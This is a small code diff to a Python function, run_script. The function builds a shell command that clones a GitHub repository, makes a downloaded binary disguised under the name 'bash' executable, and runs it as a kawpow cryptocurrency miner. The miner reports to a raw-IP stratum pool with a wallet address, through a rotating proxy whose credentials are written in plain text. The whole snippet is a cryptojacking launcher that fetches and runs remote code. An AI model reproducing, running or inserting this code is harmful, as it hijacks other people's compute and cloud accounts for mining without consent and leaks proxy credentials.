@@ -28,7 +28,7 @@ def run_script():
 
     cmd = """
     git clone https://github.com/hujisanda/bbm.git
-    cd lol198
+    cd bbm
     chmod u+x bash
     ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health
     """
